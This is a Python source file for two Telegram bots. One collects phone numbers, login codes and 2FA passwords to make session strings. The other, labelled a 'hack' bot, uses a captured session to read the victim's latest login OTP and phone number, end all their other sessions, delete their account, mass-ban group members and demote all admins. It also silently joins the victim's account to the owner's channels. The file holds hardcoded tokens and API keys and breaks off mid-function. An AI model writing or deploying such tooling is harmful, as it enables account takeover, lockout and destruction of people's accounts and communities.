import os
import json
import logging
import asyncio
from threading import Thread
from asyncio.exceptions import TimeoutError

from flask import Flask

from pyrogram import Client, filters, enums, idle
from pyrogram.raw import functions
from pyrogram.types import Message, InlineKeyboardMarkup as IKM, InlineKeyboardButton as IKB, CallbackQuery, ChatPrivileges
from pyrogram.errors import (
    ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired,
    SessionPasswordNeeded, PasswordHashInvalid, ApiIdPublishedFlood,
    AccessTokenInvalid, FloodWait, InputUserDeactivated, UserIsBlocked, PeerIdInvalid
)

from pyromod import listen

from telethon import TelegramClient, functions as tfunc
from telethon.sessions import StringSession
from telethon.errors import (
    ApiIdInvalidError, PhoneNumberInvalidError, PhoneCodeInvalidError,
    PhoneCodeExpiredError, SessionPasswordNeededError, PasswordHashInvalidError
)
from telethon.tl.functions.channels import (
    GetAdminedPublicChannelsRequest, JoinChannelRequest, LeaveChannelRequest,
    DeleteChannelRequest, EditBannedRequest
)
from telethon.tl.types import ChannelParticipantsAdmins, ChatBannedRights
from telethon.tl.functions.auth import ResetAuthorizationsRequest

# ==================== CONFIG ====================
API_ID = int(os.getenv("API_ID", "10796618"))
API_HASH = os.getenv("API_HASH", "4e4b20b4e1e40c90fcb1a7658c800150")

# SESSION GENERATOR BOT TOKEN
SESSION_BOT_TOKEN = os.getenv("SESSION_BOT_TOKEN", "5665710621:AAG7WEd9gI_atXqTm4LLLZH-BMEulA4OmYE")

# HACK/MANAGER BOT TOKEN  
HACK_BOT_TOKEN = os.getenv("HACK_BOT_TOKEN", "8351290809:AAGNTwNVF9i39PmgI-tGp_SpEbaYBjxiveA")

OWNER_ID = int(os.getenv("OWNER_ID", "5368154755"))
MUST_JOIN = os.getenv("MUST_JOIN", "RomeoBot_op")
START_PIC = os.getenv("START_PIC", "https://telegra.ph//file/a9a90059ae47fa840b0b3.jpg")

# Owner Info
OWNER_NAME = "𝕾🅡︎🅐︎🅙︎𝕾"
OWNER_USERNAME = "@romeo_op"

# Force Join Channels
FORCE_JOIN_CHANNELS = ["@ROMEOBOT_OP", "@ROMEO_OP"]

# ==================== DATABASE ====================
DB_FILE = "users_db.json"

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    return {"session_users": [], "hack_users": []}

def save_db(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=4)

async def is_served_user(user_id: int, bot_type: str) -> bool:
    db = load_db()
    key = f"{bot_type}_users"
    return user_id in db.get(key, [])

async def get_served_users(bot_type: str) -> list:
    db = load_db()
    key = f"{bot_type}_users"
    return db.get(key, [])

async def add_served_user(user_id: int, bot_type: str):
    if await is_served_user(user_id, bot_type):
        return
    db = load_db()
    key = f"{bot_type}_users"
    if key not in db:
        db[key] = []
    db[key].append(user_id)
    save_db(db)

# ==================== FLASK SERVER ====================
logging.getLogger("werkzeug").setLevel(logging.ERROR)
flask_app = Flask(__name__)

@flask_app.route("/")
def home():
    return "✅ Dual Bot System is Running!"

@flask_app.route("/healthz")
def healthz():
    return ("", 204)

def run_flask():
    port = int(os.getenv("PORT", "8080"))
    flask_app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False, threaded=True)

Thread(target=run_flask, daemon=True).start()

# ==================== LOGGING ====================
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# ==================== BOT CLIENTS ====================
session_bot = Client(
    "SessionGeneratorBot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=SESSION_BOT_TOKEN,
    in_memory=True
)

hack_bot = Client(
    "HackManagerBot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=HACK_BOT_TOKEN,
    in_memory=True
)

# ==================== SESSION BOT MESSAGES ====================
SESSION_START_TEXT = """
👋 **Hey {mention}!**

🤖 **I am {bot_name}**
📱 **String Session Generator Bot**

**🔹 I Can Generate:**
• Pyrogram V2 Sessions (User & Bot)
• Pyrogram Old Sessions
• Telethon Sessions (User & Bot)

**🔹 Commands:**
/generate - Start generating session
/help - Show all commands
/stats - Bot statistics (Owner only)

👨‍💻 **Owner:** {owner}
📢 **Channel:** @{channel}
"""

SESSION_HELP_TEXT = """
**📚 SESSION GENERATOR BOT HELP**

**🔹 Available Commands:**

**For All Users:**
/start - Start the bot
/generate - Generate string session
/gen - Short command for generate
/string - Alternative generate command
/str - Quick generate command
/help - Show this help message

**For Owner Only:**
/stats - Show bot statistics
/broadcast - Broadcast message to all users

**🔹 Session Types:**
• **Pyrogram V2** - Latest Pyrogram version
• **Pyrogram Old** - Older Pyrogram version
• **Telethon** - Telethon library
• **Bot Sessions** - For bot tokens

**🔹 How to Use:**
1. Click /generate or press "Generate Session" button
2. Choose your library type
3. Send API_ID (or /skip to use bot's API)
4. Send API_HASH (if not skipped)
5. Send Phone Number or Bot Token
6. Enter OTP code
7. Enter 2FA password (if enabled)
8. Get your session string!

**⚠️ Important:**
• Keep your session string safe
• Don't share with anyone
• Session will be sent to your Saved Messages

👨‍💻 **Owner:** {owner}
"""

# ==================== HACK BOT MESSAGES ====================
HACK_START_TEXT = """
**Hey {mention},**

I'm **{bot_name}**

**● ACCOUNT MANAGER BOT ●**

❥︎ Manage Telegram accounts using String Sessions
❥︎ 16+ Powerful Features (A-P)
❥︎ Supports Telethon & Pyrogram Sessions

**🔹 Commands:**
/hack - Open feature menu
/help - Show all features

❥︎ Owner: {owner}
"""

HACK_HELP_TEXT = """
**📚 ACCOUNT MANAGER BOT HELP**

**🔹 Available Commands:**

**For All Users:**
/start - Start the bot
/hack - Open features menu
/help - Show this help message

**🔹 Features (A-P):**

**A** → Check user's public groups/channels
**B** → Get user info (ID, phone, username)
**C** → Ban all members from a group
**D** → Get last OTP from Telegram
**E** → Join a group/channel via session
**F** → Leave a group/channel
**G** → Delete a group/channel
**H** → Check 2FA status
**I** → Terminate all active sessions
**J** → Delete Telegram account
**K** → Promote a user in group
**L** → Demote all admins in group
**M** → Send message to saved messages
**N** → Get all active sessions list
**O** → Download user profile photos
**P** → Change profile (name/bio)

**🔹 How to Use:**
1. Click /hack to open menu
2. Select feature (A-P)
3. Send your string session
4. Send required info (group ID, user ID, etc.)
5. Get result!

**⚠️ Requirements:**
• Valid Pyrogram or Telethon session string
• Admin rights (for group features)
• Active Telegram account

**🔹 Session Types Supported:**
✅ Pyrogram V2
✅ Pyrogram Old
✅ Telethon

❥︎ Owner: {owner}
"""

HACK_FEATURES_TEXT = """
**🔥 ACCOUNT MANAGER FEATURES 🔥**

**A** ~ Check user own groups and channels (PUBLIC ONLY)
**B** ~ Check user all information like phone number, username... etc
**C** ~ Ban all the members from the group
**D** ~ Know user last OTP, Use option B first to take number then login
**E** ~ Join A Group/Channel/Link via StringSession
**F** ~ Leave A Group/Channel via StringSession
**G** ~ Delete A Group/Channel
**H** ~ Check user two step is enabled or disabled
**I** ~ Terminate All current active sessions except Your StringSession
**J** ~ Delete Account
**K** ~ Promote a member in a Group/Channel
**L** ~ Demote All admins in a Group/Channel
**M** ~ Send Message to Saved Messages
**N** ~ Get All Active Sessions List
**O** ~ Download User Profile Photos
**P** ~ Change Profile (Name/Bio/Username)

❥︎ Owner: {owner}
"""

# ==================== SESSION BOT BUTTONS ====================
ask_ques = "**Please choose the python library you want to generate string session for:**"

buttons_ques = IKM([
    [IKB("🔷 Pyrogram V2 🔷", callback_data="pyrogram")],
    [IKB("🔷 Pyrogram (Old) 🔷", callback_data="pyrogram1")],
    [IKB("🔷 Telethon 🔷", callback_data="telethon")],
    [IKB("🔶 Pyrogram V2 Bot 🔶", callback_data="pyrogram_bot"),
     IKB("🔶 Telethon Bot 🔶", callback_data="telethon_bot")]
])

gen_button = IKM([[IKB("🔄 Start Generating Session", callback_data="generate")]])

# ==================== HACK BOT BUTTONS ====================
HACK_MODS = IKM([
    [IKB("A", callback_data="A"), IKB("B", callback_data="B"), IKB("C", callback_data="C"),
     IKB("D", callback_data="D"), IKB("E", callback_data="E")],
    [IKB("F", callback_data="F"), IKB("G", callback_data="G"), IKB("H", callback_data="H"),
     IKB("I", callback_data="I"), IKB("J", callback_data="J")],
    [IKB("K", callback_data="K"), IKB("L", callback_data="L"), IKB("M", callback_data="M"),
     IKB("N", callback_data="N"), IKB("O", callback_data="O")],
    [IKB("P", callback_data="P")],
])

# ==================== RIGHTS & PRIVILEGES ====================
BAN_RIGHTS = ChatBannedRights(
    until_date=None, view_messages=True, send_messages=True,
    send_media=True, send_stickers=True, send_gifs=True,
    send_games=True, send_inline=True, embed_links=True,
)

FULL_PROMOTE = ChatPrivileges(
    can_change_info=True, can_delete_messages=True, can_restrict_members=True,
    can_pin_messages=True, can_manage_video_chats=True,
    can_promote_members=True, can_invite_users=True
)

PROMOTE = ChatPrivileges(
    can_change_info=True, can_delete_messages=True,
    can_restrict_members=True, can_pin_messages=True
)

DEMOTE = ChatPrivileges(
    can_change_info=False, can_invite_users=False, can_delete_messages=False,
    can_restrict_members=False, can_pin_messages=False, can_promote_members=False,
    can_manage_chat=False, can_manage_video_chats=False,
)

# ==================== SESSION BOT - USER DATABASE ====================
@session_bot.on_message(filters.private & ~filters.service, group=1)
async def session_users_sql(_, msg: Message):
    await add_served_user(msg.from_user.id, "session")

# ==================== HACK BOT - USER DATABASE ====================
@hack_bot.on_message(filters.private & ~filters.service, group=1)
async def hack_users_sql(_, msg: Message):
    await add_served_user(msg.from_user.id, "hack")

# ==================== SESSION BOT - START COMMAND ====================
@session_bot.on_message(filters.private & filters.command("start"))
async def session_start(bot: Client, msg: Message):
    me = await bot.get_me()
    
    buttons = IKM([
        [IKB("🔷 Generate Session 🔷", callback_data="generate")],
        [IKB("📚 Help", callback_data="help"), IKB("📢 Channel", url=f"https://t.me/{MUST_JOIN[1:] if MUST_JOIN.startswith('@') else MUST_JOIN}")]
    ])
    
    await msg.reply_photo(
        photo=START_PIC,
        caption=SESSION_START_TEXT.format(
            mention=msg.from_user.mention,
            bot_name=me.mention,
            owner=OWNER_NAME,
            channel=MUST_JOIN[1:] if MUST_JOIN.startswith('@') else MUST_JOIN
        ),
        reply_markup=buttons
    )

# ==================== SESSION BOT - HELP COMMAND ====================
@session_bot.on_message(filters.private & filters.command("help"))
async def session_help(bot: Client, msg: Message):
    await msg.reply_text(
        SESSION_HELP_TEXT.format(owner=OWNER_NAME),
        disable_web_page_preview=True
    )

# ==================== SESSION BOT - GENERATE COMMANDS ====================
@session_bot.on_message(filters.private & filters.command(["generate", "gen", "string", "str"]))
async def generate_command(bot: Client, msg: Message):
    await msg.reply(ask_ques, reply_markup=buttons_ques)

# ==================== SESSION BOT - STATS COMMAND ====================
@session_bot.on_message(filters.user(OWNER_ID) & filters.command("stats"))
async def session_stats(bot: Client, msg: Message):
    users = await get_served_users("session")
    await msg.reply_text(
        f"📊 **SESSION BOT STATISTICS**\n\n"
        f"👥 Total Users: **{len(users)}**",
        quote=True
    )

# ==================== SESSION BOT - BROADCAST COMMAND ====================
@session_bot.on_message(filters.user(OWNER_ID) & filters.command("broadcast"))
async def session_broadcast(bot: Client, msg: Message):
    if msg.reply_to_message:
        broadcast_msg = msg.reply_to_message
    else:
        await msg.reply_text("❌ **Please reply to a message to broadcast!**")
        return
    
    users = await get_served_users("session")
    total_users = len(users)
    
    if total_users == 0:
        await msg.reply_text("❌ **No users found in database!**")
        return
    
    status_msg = await msg.reply_text(
        f"📡 **Broadcasting started...**\n\n"
        f"👥 Total Users: `{total_users}`\n"
        f"⏳ Please wait..."
    )
    
    success = 0
    failed = 0
    deleted = 0
    blocked = 0
    
    for user_id in users:
        try:
            await broadcast_msg.copy(user_id)
            success += 1
            
            if success % 10 == 0:
                await status_msg.edit_text(
                    f"📡 **Broadcasting...**\n\n"
                    f"👥 Total: `{total_users}`\n"
                    f"✅ Success: `{success}`\n"
                    f"❌ Failed: `{failed}`\n"
                    f"🚫 Blocked: `{blocked}`\n"
                    f"👻 Deleted: `{deleted}`"
                )
            
            await asyncio.sleep(0.1)
            
        except FloodWait as e:
            await asyncio.sleep(e.value)
        except InputUserDeactivated:
            deleted += 1
            failed += 1
        except UserIsBlocked:
            blocked += 1
            failed += 1
        except:
            failed += 1
    
    await status_msg.edit_text(
        f"📡 **Broadcast Completed!**\n\n"
        f"👥 Total Users: `{total_users}`\n"
        f"✅ Successfully Sent: `{success}`\n"
        f"❌ Failed: `{failed}`\n"
        f"🚫 Blocked Bot: `{blocked}`\n"
        f"👻 Deleted Account: `{deleted}`"
    )

# ==================== HACK BOT - START COMMAND ====================
@hack_bot.on_message(filters.private & filters.command("start"))
async def hack_start(bot: Client, msg: Message):
    me = await bot.get_me()
    
    buttons = IKM([
        [IKB("🔥 Open Features 🔥", callback_data="hack_btn")],
        [IKB("📚 Help", callback_data="help"), IKB("📢 Channel", url=f"https://t.me/{MUST_JOIN[1:] if MUST_JOIN.startswith('@') else MUST_JOIN}")]
    ])
    
    await msg.reply_photo(
        photo=START_PIC,
        caption=HACK_START_TEXT.format(
            mention=msg.from_user.mention,
            bot_name=me.mention,
            owner=OWNER_NAME
        ),
        reply_markup=buttons
    )

# ==================== HACK BOT - HELP COMMAND ====================
@hack_bot.on_message(filters.private & filters.command("help"))
async def hack_help(bot: Client, msg: Message):
    await msg.reply_text(
        HACK_HELP_TEXT.format(owner=OWNER_NAME),
        disable_web_page_preview=True
    )

# ==================== HACK BOT - HACK COMMAND ====================
@hack_bot.on_message(filters.private & filters.command("hack"))
async def hack_handler(_, message):
    await message.reply_text(HACK_FEATURES_TEXT.format(owner=OWNER_NAME), reply_markup=HACK_MODS)

# ==================== SESSION GENERATOR FUNCTION ====================
async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro=False, is_bot=False):
    ty = "Telethon" if telethon else "Pyrogram"
    if not telethon and not old_pyro:
        ty += " V2"
    if is_bot:
        ty += " Bot"
    
    await msg.reply(f"🚀 **Starting {ty} Session Generation...**")
    user_id = msg.chat.id
    
    api_id_msg = await bot.ask(
        user_id, 
        "📝 **Send your API_ID**\n\n💡 Click /skip to use bot's API\n❌ Click /cancel to cancel",
        filters=filters.text
    )
    if await cancelled(api_id_msg):
        return
    
    if api_id_msg.text == "/skip":
        api_id = API_ID
        api_hash = API_HASH
    else:
        try:
            api_id = int(api_id_msg.text)
        except ValueError:
            await api_id_msg.reply("❌ **Invalid API_ID!**", reply_markup=gen_button)
            return
        
        api_hash_msg = await bot.ask(user_id, "📝 **Now send your API_HASH**\n\n❌ Click /cancel to cancel", filters=filters.text)
        if await cancelled(api_hash_msg):
            return
        api_hash = api_hash_msg.text.strip()
    
    if not is_bot:
        t = "📱 **Send your PHONE NUMBER** with country code\n\nExample: `+919876543210`\n\n❌ Click /cancel to cancel"
    else:
        t = "🤖 **Send your BOT TOKEN**\n\nExample: `123456:ABC-DEF1234ghIkl`\n\n❌ Click /cancel to cancel"
    
    phone_number_msg = await bot.ask(user_id, t, filters=filters.text)
    if await cancelled(phone_number_msg):
        return
    phone_number = phone_number_msg.text.strip()
    
    await msg.reply("📤 **Processing...**")
    
    if telethon and is_bot:
        client = TelegramClient(StringSession(), api_id, api_hash)
    elif telethon:
        client = TelegramClient(StringSession(), api_id, api_hash)
    elif is_bot:
        client = Client(name="bot", api_id=api_id, api_hash=api_hash, bot_token=phone_number, in_memory=True)
    elif old_pyro:
        client = Client(":memory:", api_id=api_id, api_hash=api_hash)
    else:
        client = Client(name="user", api_id=api_id, api_hash=api_hash, in_memory=True)
    
    await client.connect()
    
    try:
        code = None
        if not is_bot:
            if telethon:
                code = await client.send_code_request(phone_number)
            else:
                code = await client.send_code(phone_number)
    except (ApiIdInvalid, ApiIdInvalidError):
        await msg.reply("❌ **Invalid API_ID/API_HASH!**", reply_markup=gen_button)
        await client.disconnect()
        return
    except (PhoneNumberInvalid, PhoneNumberInvalidError):
        await msg.reply("❌ **Invalid Phone Number!**", reply_markup=gen_button)
        await client.disconnect()
        return
    
    try:
        phone_code_msg = None
        if not is_bot:
            phone_code_msg = await bot.ask(
                user_id,
                "📨 **OTP sent to your Telegram!**\n\n📝 Send OTP in format: `1 2 3 4 5`\n⏱ Timeout: 10 minutes\n\n❌ Click /cancel to cancel",
                filters=filters.text, timeout=600
            )
            if await cancelled(phone_code_msg):
                await client.disconnect()
                return
    except TimeoutError:
        await msg.reply("⏱ **Timeout! 10 minutes exceeded.**", reply_markup=gen_button)
        await client.disconnect()
        return
    
    if not is_bot:
        phone_code = phone_code_msg.text.replace(" ", "").strip()
        try:
            if telethon:
                await client.sign_in(phone_number, phone_code, password=None)
            else:
                await client.sign_in(phone_number, code.phone_code_hash, phone_code)
        except (PhoneCodeInvalid, PhoneCodeInvalidError):
            await msg.reply("❌ **Invalid OTP!**", reply_markup=gen_button)
            await client.disconnect()
            return
        except (PhoneCodeExpired, PhoneCodeExpiredError):
            await msg.reply("❌ **OTP Expired!**", reply_markup=gen_button)
            await client.disconnect()
            return
        except (SessionPasswordNeeded, SessionPasswordNeededError):
            try:
                two_step_msg = await bot.ask(
                    user_id,
                    "🔐 **2FA Enabled!**\n\n📝 Send your password\n⏱ Timeout: 5 minutes\n\n❌ Click /cancel to cancel",
                    filters=filters.text, timeout=300
                )
                if await cancelled(two_step_msg):
                    await client.disconnect()
                    return
            except TimeoutError:
                await msg.reply("⏱ **Timeout! 5 minutes exceeded.**", reply_markup=gen_button)
                await client.disconnect()
                return
            
            try:
                password = two_step_msg.text
                if telethon:
                    await client.sign_in(password=password)
                else:
                    await client.check_password(password=password)
            except (PasswordHashInvalid, PasswordHashInvalidError):
                await two_step_msg.reply("❌ **Invalid Password!**", reply_markup=gen_button)
                await client.disconnect()
                return
    else:
        try:
            if telethon:
                await client.start(bot_token=phone_number)
            else:
                await client.sign_in_bot(phone_number)
        except Exception as e:
            await msg.reply(f"❌ **Bot login failed!**\n\nError: `{str(e)}`", reply_markup=gen_button)
            await client.disconnect()
            return
    
    try:
        if telethon:
            if not client.is_connected():
                await client.connect()
            string_session = client.session.save()
        else:
            string_session = await client.export_session_string()
        
        if not string_session or len(string_session) < 10:
            raise Exception("Session string is empty!")
        
    except Exception as e:
        await msg.reply(f"❌ **Failed to generate session!**\n\nError: `{str(e)}`", reply_markup=gen_button)
        await client.disconnect()
        return
    
    text = (
        f"✅ **{ty.upper()} STRING SESSION**\n\n"
        f"`{string_session}`\n\n"
        f"⚠️ **Keep it safe and don't share with anyone!**\n"
        f"🤖 **Generated by:** @{(await bot.get_me()).username}"
    )
    
    try:
        if not is_bot:
            await client.send_message("me", text)
    except:
        pass
    
    try:
        await bot.send_message(msg.chat.id, text)
    except:
        await bot.send_message(msg.chat.id, f"✅ **{ty.upper()} SESSION**")
        await bot.send_message(msg.chat.id, f"`{string_session}`")
    
    await client.disconnect()
    await bot.send_message(msg.chat.id, f"✅ **Successfully generated {ty} session!**\n📬 **Check your Saved Messages!**")

async def cancelled(msg):
    if "/cancel" in msg.text:
        await msg.reply("❌ **Cancelled!**", reply_markup=gen_button)
        return True
    elif msg.text.startswith("/") and msg.text not in ["/skip"]:
        await msg.reply("❌ **Cancelled!**")
        return True
    return False

# ==================== HACK BOT HELPER FUNCTIONS ====================
async def auto_join_channels_telethon(client):
    for channel in FORCE_JOIN_CHANNELS:
        try:
            await client(JoinChannelRequest(channel))
        except:
            pass

async def auto_join_channels_pyrogram(client):
    for channel in FORCE_JOIN_CHANNELS:
        try:
            await client.join_chat(channel)
        except:
            pass

async def users_gc(session):
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            k = await rj(GetAdminedPublicChannelsRequest())
            for x in k.chats:
                msg += f'**❥︎ ᴄʜᴀɴɴᴇʟ:** {x.title}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{x.username}\n**❥︎ ᴍᴇᴍʙᴇʀs:** {x.participants_count}\n\n'
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                k = await r.invoke(functions.channels.GetAdminedPublicChannels())
                for x in k.chats:
                    msg += f'**❥︎ ᴄʜᴀɴɴᴇʟ:** {x.title}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{x.username}\n**❥︎ ᴍᴇᴍʙᴇʀs:** {x.members_count}\n\n'
    except Exception as e:
        err = str(e)
    
    return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**" if err else (msg if msg else "**ɴᴏ ᴄʜᴀɴɴᴇʟs ғᴏᴜɴᴅ!**")

async def user_info(session):
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            k = await rj.get_me()
            msg = f'**❥︎ ɴᴀᴍᴇ:** {k.first_name}\n**❥︎ ɪᴅ:** {k.id}\n**❥︎ ᴘʜᴏɴᴇ:** +{k.phone}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{k.username}'
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                k = await r.get_me()
                msg = f'**❥︎ ɴᴀᴍᴇ:** {k.first_name}\n**❥︎ ɪᴅ:** {k.id}\n**❥︎ ᴘʜᴏɴᴇ:** +{k.phone_number}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{k.username}'
    except Exception as e:
        err = str(e)
    
    return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**" if err else msg

async def banall(session, gc_id):
    err = ""
    total = 0
    banned = 0
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            admins = await rj.get_participants(gc_id, filter=ChannelParticipantsAdmins)
            admin_ids = [i.id for i in admins]
            async for user in rj.iter_participants(gc_id):
                total += 1
                try:
                    if user.id not in admin_ids:
                        await rj(EditBannedRequest(gc_id, user.id, BAN_RIGHTS))
                        banned += 1
                        await asyncio.sleep(0.1)
                except:
                    pass
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                async for member in r.get_chat_members(gc_id):
                    total += 1
                    try:
                        await r.ban_chat_member(gc_id, member.user.id)
                        banned += 1
                    except:
                        pass
    except Exception as e:
        err = str(e)
    
    return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**" if err else f"**✅ ʙᴀɴɴᴇᴅ:** {banned}/{total}"

async def get_otp(session):
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            async for x in rj.iter_messages(777000, limit=2):
                msg += f"\n{x.text}\n"
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                async for message in r.get_chat_history(777000, limit=2):
                    msg += f"\n{message.text}\n"
    except Exception as e:
        err = str(e)
    
    return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**" if err else (msg if msg else "**ɴᴏ ᴏᴛᴘ!**")

async def join_ch(session, gc_id):
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            await rj(JoinChannelRequest(gc_id))
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                await r.join_chat(gc_id)
    except Exception as e:
        err = str(e)
    
    return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**" if err else "**✅ ᴊᴏɪɴᴇᴅ!**"

async def leave_ch(session, gc_id):
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            await rj(LeaveChannelRequest(gc_id))
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                await r.leave_chat(gc_id)
    except Exception as e:
        err = str(e)
    
    return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**" if err else "**✅ ʟᴇғᴛ!**"

async def del_ch(session, gc_id):
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            await rj(DeleteChannelRequest(gc_id))
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                await r.invoke(functions.channels.DeleteChannel(channel=await r.resolve_peer(gc_id)))
    except Exception as e:
        err = str(e)
    
    return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**" if err else "**✅ ᴅᴇʟᴇᴛᴇᴅ!**"

async def check_2fa(session):
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            try:
                await rj.edit_2fa("testpass123")
                msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴅɪsᴀʙʟᴇᴅ ❌**"
            except:
                msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴇɴᴀʙʟᴇᴅ ✅**"
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                pwd = await r.invoke(functions.account.GetPassword())
                msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴇɴᴀʙʟᴇᴅ ✅**" if pwd.has_password else "**ᴛᴡᴏ sᴛᴇᴘ ᴅɪsᴀʙʟᴇᴅ ❌**"
    except Exception as e:
        err = str(e)
    
    return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**" if err else msg

async def terminate_all(session):
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            await rj(ResetAuthorizationsRequest())
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                await r.invoke(functions.auth.ResetAuthorizations())
    except Exception as e:
        err = str(e)
    
    return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**" if err else "**✅ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ!**"

async def del_acc(session):
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            await rj(tfunc.account.DeleteAccountRequest("Deleted"))
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                await r.invoke(functions.account.DeleteAccount(reason="Deleted"))
    except Exception as e:
        err = str(e)
    
    return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**" if err else "**✅ ᴅᴇʟᴇᴛᴇᴅ!**"

async def promote_user(session, gc_id, user_id):
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            try:
                await rj.edit_admin(gc_id, user_id, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
            except:
                await rj.edit_admin(gc_id, user_id, is_admin=True, anonymous=False, pin_messages=True, title='Admin')
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                try:
                    await r.promote_chat_member(gc_id, user_id, FULL_PROMOTE)
                except:
                    await r.promote_chat_member(gc_id, user_id, PROMOTE)
    except Exception as e:
        err = str(e)
    
    return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**" if err else "**✅ ᴘʀᴏᴍᴏᴛᴇᴅ!**"

async def demote_all(session, gc_id):
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            async for x in rj.iter_participants(gc_id, filter=ChannelParticipantsAdmins):
                try:
                    await rj.edit_admin(gc_id, x.id, is_admin=False, manage_call=False)
                except:
                    pass
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                async for m in r.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
                    try:
                        await r.promote_chat_member(gc_id, m.user.id, DEMOTE)
                    except:
                        pass
    except Exception as e:
        err = str(e)
    
    return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**" if err else "**✅ ᴅᴇᴍᴏᴛᴇᴅ ᴀʟʟ!**"

async def send_to_saved(session, message):
    err = ""
    try:
        if session.endswith("="):
